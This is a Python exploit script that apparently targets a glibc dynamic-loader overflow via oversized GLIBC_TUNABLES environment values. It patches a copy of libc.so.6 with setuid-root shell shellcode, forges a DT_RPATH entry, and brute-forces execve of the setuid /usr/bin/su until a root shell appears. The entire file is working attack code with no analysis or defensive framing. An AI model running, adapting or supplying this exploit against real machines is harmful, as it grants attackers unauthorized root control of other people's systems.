import os
import ctypes
import shutil
import struct
import resource
import time

# su symbol
su_symbol = '"'
su_offset = -20

def drop_libc():
    if not os.path.exists("./libc.so.6"):
        import pwn
        pwn.context.os = "linux"
        pwn.context.arch = "x86_64"

        libc = pwn.ELF("/lib/x86_64-linux-gnu/libc.so.6")
        with open(libc.path, "rb") as f:
            d = bytearray(f.read())

        sc = pwn.asm(pwn.shellcraft.setuid(0) + pwn.shellcraft.setgid(0) + pwn.shellcraft.sh())

        orig = libc.read(libc.sym["__libc_start_main"], 0x10)
        idx = d.find(orig)
        d[idx:idx+len(sc)] = sc

        with open("./libc.so.6", "wb") as f:
            f.write(d)
    if not os.path.isdir(su_symbol):
        os.mkdir(su_symbol)
        print("Making dir...")
    if not os.path.exists(su_symbol + '/libc.so.6'):
        shutil.copyfile("./libc.so.6", su_symbol + '/libc.so.6')
        print("Copying shell-libc to: ", su_symbol + '/libc.so.6')
    os.chmod(su_symbol + '/libc.so.6', 0o0755)

if __name__ == '__main__':
    drop_libc()

    libc = ctypes.CDLL('libc.so.6')
    libc.execve.argtypes = ctypes.c_char_p,ctypes.POINTER(ctypes.c_char_p),ctypes.POINTER(ctypes.c_char_p)
    libc.execve.restype = ctypes.c_ssize_t

    filler = b"GLIBC_TUNABLES=glibc.malloc.mxfast=".ljust(0xd00-1, b"F") + b'\x00'
    kv = b"GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=".ljust(0x600-1, b"A") + b'\x00'
    filler2 = b"GLIBC_TUNABLES=glibc.malloc.mxfast=".ljust(0x620-1, b"F") + b'\x00'

    dt_rpath = struct.pack("q", su_offset)*(0x4000)     #-20 -> "\xec\xff\xff\xff\xff\xff\xff\xff"
    dt_rpath = dt_rpath[:-1] + b'\x00'

    envp = [b""]*0xfff + [None]
    envp[0] = filler                                # pads away loader rw section
    envp[1] = kv                                    # payload
    envp[0x65] = b""                                # struct link_map ofs marker
    envp[0x65 + 0xb8] = b"\x30\xf0\xff\xff\xfd\x7f" # l_info[DT_RPATH]
    envp[0xf7f] = filler2                           # pads away :tunable2=AAA: in between
    for n in range(0, 0x2f):
        envp[0xf80+n] = dt_rpath
    envp[0xffe] = b"AAAA"                           # alignment, currently already aligned

    resource.setrlimit(resource.RLIMIT_STACK, (resource.RLIM_INFINITY, resource.RLIM_INFINITY))

    argv = [b"/usr/bin/su", b'--help', None]
    cargv = (ctypes.c_char_p * (len(argv)))(*argv)
    cenv  = (ctypes.c_char_p * (len(envp)))(*envp)

    count = 0
    while True:
        count += 1
        if count %100 == 0:
            print(count)
        val = os.fork()
        if val == 0:
            libc.execve(argv[0], cargv, cenv)
        else:
            start = time.time()
            os.wait()
            stop = time.time()
            if stop - start > 1:
                break
